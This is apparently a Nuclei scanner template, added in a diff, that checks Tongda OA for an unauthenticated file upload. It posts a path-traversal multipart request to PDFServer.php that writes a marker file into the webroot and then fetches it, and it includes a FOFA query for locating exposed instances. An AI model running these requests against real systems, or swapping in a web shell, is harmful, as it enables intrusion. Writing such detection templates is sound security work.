@@ -1,0 +1,41 @@
+id: tongda-oa-pdfserver-file-upload
+
+info:
+  name: Tongda OA PDFServer File Upload
+  author: zp857
+  severity: critical
+  tags: tongda-oa,fileupload
+  metadata:
+    fofa-query: 'body="Anywhere 2017版" || body="/static/templates/2017_01/" || body="通达精灵2017版"'
+
+requests:
+  - raw:
+      - |
+        POST /module/ISignature/PDFServer.php?OPTION=SAVEFILE&RECORDID=../myoa/webroot/qianxin&FILETYPE=txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------16119693012599236431347908481
+
+        -----------------------------16119693012599236431347908481
+        Content-Disposition: form-data; name="file1"; filename="x.jpg"
+        Content-Type: image/jpeg
+
+        qianxinnb
+        -----------------------------16119693012599236431347908481
+        Content-Disposition: form-data; name="submit"
+
+        Submit
+        -----------------------------16119693012599236431347908481
+
+      - |
+        GET /qianxin.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qianxinnb"
+
+      - type: status
+        status:
+          - 200
